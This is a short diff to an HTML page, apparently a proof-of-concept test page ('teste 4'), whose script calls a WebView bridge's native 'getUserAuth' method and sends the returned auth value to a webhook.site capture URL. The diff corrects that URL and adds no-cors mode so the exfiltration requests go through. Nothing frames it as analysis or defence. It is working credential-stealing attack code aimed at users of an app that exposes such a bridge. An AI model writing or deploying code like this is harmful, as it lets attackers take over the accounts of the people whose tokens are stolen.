@@ -9,21 +9,21 @@
 
         var dsBridge = require("dsbridge")
 
-        const webhook = "https://webhook.site/#!/view/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b"
+        const webhook = "https://webhook.site/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b"
 
         dsBridge.call("getUserAuth", function (value) {
-            fetch(webhook + "?data=" + value)
+            fetch(webhook + "?data=" + value, { mode: "no-cors" })
 
         })
 
     </script>
     <script>
-        fetch("https://webhook.site/#!/view/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b", { mode: "no-cors" })
+        fetch("https://webhook.site/1d00653f-ca2e-4fe0-b8cb-e8850d7fe15b", { mode: "no-cors" })
     </script>
 </head>
 
 <body>
-    <h1>teste 3</h1>
+    <h1>teste 4</h1>
 </body>
 
 </html>
